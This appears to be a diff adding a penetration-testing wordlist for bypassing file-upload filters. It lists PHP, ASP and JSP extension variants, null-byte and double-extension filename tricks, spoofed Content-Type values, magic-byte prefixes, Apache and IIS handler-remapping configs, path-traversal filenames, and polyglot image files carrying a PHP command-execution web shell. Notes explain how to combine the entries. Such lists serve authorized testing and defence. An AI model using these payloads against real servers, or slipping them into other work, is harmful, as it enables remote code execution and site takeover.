@@ -1,0 +1,154 @@
+# ============================================================
+# File Upload Bypass Fuzzing Wordlist
+# Usage: fuzz the FILENAME/extension when uploading a fixed malicious
+#        payload (e.g. <?php system($_GET['cmd']);?>), and/or fuzz the
+#        Content-Type header value separately.
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: PHP extension bypass variants (filename.FUZZ)
+# ---------------------------------------
+php
+php2
+php3
+php4
+php5
+php7
+pht
+phtm
+phtml
+phar
+pgif
+phpt
+phps
+phls
+inc
+shtml
+htaccess
+
+# ---------------------------------------
+# SECTION 2: Case / null-byte / trailing char bypass (filename tricks)
+# ---------------------------------------
+shell.php
+shell.PHP
+shell.Php
+shell.pHp
+shell.php.
+shell.php..
+shell.php ..
+shell.php%00.jpg
+shell.php%00.png
+shell.php\x00.jpg
+shell.php.jpg
+shell.jpg.php
+shell.php%20
+shell.php%0a
+shell.php%0d%0a
+shell.php#
+shell.php;.jpg
+shell.php:.jpg
+shell.php::$DATA
+shell.pHP5
+
+# ---------------------------------------
+# SECTION 3: Double extension / archive-based tricks
+# ---------------------------------------
+shell.jpg.php
+shell.php.jpg
+shell.jpeg.php5
+shell.png.phtml
+shell.gif.pht
+shell.php%00.gif
+shell.asp;.jpg
+shell.aspx;.jpg
+
+# ---------------------------------------
+# SECTION 4: Other server-side language extensions
+# ---------------------------------------
+asp
+aspx
+asa
+asax
+ashx
+ascx
+cer
+cdx
+config
+jsp
+jspx
+jsw
+jsv
+jspf
+war
+soap
+py
+rb
+pl
+cgi
+sh
+htaccess
+
+# ---------------------------------------
+# SECTION 5: Content-Type header bypass values (keep malicious filename)
+# ---------------------------------------
+image/jpeg
+image/png
+image/gif
+image/svg+xml
+text/plain
+application/octet-stream
+application/x-php
+image/jpeg%00
+image/jpeg
+multipart/form-data
+
+# ---------------------------------------
+# SECTION 6: Magic byte / file signature prefixes (prepend to payload)
+# ---------------------------------------
+GIF89a;
+\xFF\xD8\xFF\xE0
+\x89PNG\r\n\x1a\n
+%PDF-1.4
+BM
+
+# ---------------------------------------
+# SECTION 7: .htaccess / config-based upload chains (Apache)
+# ---------------------------------------
+AddType application/x-httpd-php .jpg
+AddHandler application/x-httpd-php .jpg
+SetHandler application/x-httpd-php
+php_value engine 1
+
+# ---------------------------------------
+# SECTION 8: Web.config based (IIS)
+# ---------------------------------------
+<configuration><system.webServer><handlers><add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"/></handlers></system.webServer></configuration>
+
+# ---------------------------------------
+# SECTION 9: Filename special characters (path traversal via filename)
+# ---------------------------------------
+../../../var/www/html/shell.php
+....//....//shell.php
+shell.php/.
+shell.php\..\..\
+%2e%2e%2fshell.php
+shell%00.php
+
+# ---------------------------------------
+# SECTION 10: Polyglot files (valid image + valid PHP)
+# (embed inside real image binary; reference triggers only)
+# ---------------------------------------
+GIF89a<?php system($_GET['cmd']); ?>
+\xFF\xD8\xFF<?php system($_GET['cmd']); ?>
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Combine Section 1 extensions with Section 2 trick suffixes
+#   (e.g. shell.pht%00.jpg) for compound bypass attempts.
+# - Fuzz filename and Content-Type independently — some apps only
+#   validate one or the other.
+# - Section 7/8 require achieving upload of a config file first, then
+#   accessing the upload directory to trigger the new handler mapping.
+# - Only use against systems you are explicitly authorized to test.
